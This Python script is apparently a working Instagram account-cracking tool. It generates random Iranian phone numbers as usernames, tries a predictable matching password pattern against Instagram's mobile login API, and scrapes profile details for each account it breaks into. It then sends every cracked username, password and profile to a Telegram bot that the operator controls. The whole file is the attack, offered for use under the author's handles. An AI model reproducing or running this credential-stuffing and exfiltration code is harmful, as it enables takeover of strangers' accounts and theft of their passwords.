from time import sleep
import webbrowser
import random
import requests
from user_agent import generate_user_agent
import json
from secrets import token_hex
import secrets
import os
import sys
import uuid
from uuid import uuid4
from time import sleep
import webbrowser
import pyfiglet 
import time
aa=0
zz=0
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
Z2 = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E1 = '\x1b[1;31m' # احمر
G1 = '\x1b[1;32m'
S1 = '\x1b[1;33m'
Z = '\x1b[2;31m'
G2 = '\x1b[1;32m'
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
import time
timee=time.asctime()
print(timee)
print('  ')
hunter = pyfiglet.figlet_format("REX")
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(2/100)
j(Y+hunter)
j('='*60)
os.system("clear") 
print('   ') 
print('   ')
def a(z):
    for e in z:
     sys.stdout.write(e) 
     sys.stdout.flush() 
     sleep(260/10000)
import time
timee=time.asctime()
print(timee)
hunter1 = pyfiglet.figlet_format("Mr. Rex  ")
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/100)
j(X+hunter1)
print('  ')
j(Y+'='*60)
ask = j(F + '''
1 - BY : @FFF_FC
0 - CH : @UUUU4a \n''')  
j(Y+'='*40)
sleep(1)
print('') 
tok= input('TOKEN : ')
print('  ')
ID = input('ID Tele : ')
shuger = input (''+B+'('+A+'!'+X+')'+B+'  ⌯ اكتب 1 :  '+F)
print('  ')
j('='*60)
print('  ')
import time
t = time.localtime()
current_time = time.strftime("%o:%o:%o", t)
print('  ') 
sleep(2)
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯ 𝑠𝑡𝑎𝑟𝑡 chek").json()
id_msg	=(start_msg['result']["message_id"])
def code_mrko(userQ,password):
	cookie = secrets.token_hex(8)*2
	head = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"
}
	url_id = f'https://www.instagram.com/{userQ}/?__a=1'
	req_id= requests.get(url_id,headers=head).json()
	name    = str(req_id['graphql']['user']['full_name'])
	id    = str(req_id['graphql']['user']['id'])
	followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
	following    = str(req_id['graphql']['user']['edge_follow']['count'])
	isp    = str(req_id['graphql']['user']['is_private'])
	idd    = str(req_id['graphql']['user']['id'])
	bio    = str(req_id['graphql']['user']['biography'])
	re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
	ree = re.json()
	dat = ree['data']
	shug = (f"""

 Hunged by master: @uuuu4a
= = = = = = = = = = = = = = =
[=] ɴᴀᴍᴇ 𖡑 : {name}
[=] ụѕᴇʀ 𖤼 : {userQ}
[=] ᴘᴀѕѕ : {password}
[=] ɪᴅ : {idd}  
[=] ғᴏʟʟᴏᴡᴇʀѕ : {followes}
[=] ғᴏʟʟᴏᴡɪɴɢ : {following}
[=] ᴅᴀᴛᴀ : {dat}
[=] ᴘʀɪᴠᴀᴛᴇ : {isp} 
[=] ʙɪᴏ : {bio} 
[=] ᴛɪᴍᴇ : {current_time} 
= = = = = = = = = = = = = = 
[=] BY : @uuuu4a
 """)
	tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={shug}''')
	i = requests.post(tlg)
	print(G+shug)
 

url='https://i.instagram.com/api/v1/accounts/login/'

headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)', 

             'Accept':'*/*', 

             'Cookie':'missing', 

             'Accept-Encoding':'gzip, deflate', 

             'Accept-Language':'en-US', 

             'X-IG-Capabilities':'3brTvw==', 

             'X-IG-Connection-Type':'WIFI', 

             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 

             'Host':'i.instagram.com'}

w = 'https://pastebin.com/raw/w3hRyEB8'
rss = requests.get(w).text
if '[VPN]' in rss:
    sleep(0.1)
    user = '0987654321'
    while True:
        if shuger == '1':
            us = str("".join(random.choice(user)for i in range(7)))
            username = '+98912'  +us
            password = '0912'  +us   
        uid = str(uuid4())              
        data = {
             'uuid':uid, 

             'password':password, 

             'username':username, 

             'device_id':uid, 

             'from_reg':'false', 

             '_csrftoken':'missing', 

             'login_attempt_countn':'0'}
        req= requests.post(url, headers=headers, data=data)        
        if 'logged_in_user' in req.json():
            zz+=1
            userQ = req.json()['logged_in_user']['username']
            code_mrko(userQ,password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print (S+'user : '+username+': passw : '+password)
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= ممكن ادورلك حسابات وتنتظرني \n = = =\n\Fishing {zz}\Error: {aa}\Search is searched: {password}\time : {current_time}\n= = = = = = = = = = = = = = =\n\n BY: @uuuu4a ")
            print (E+'user : '+username+': passw : '+password)
            aa+=1
المطور (rex)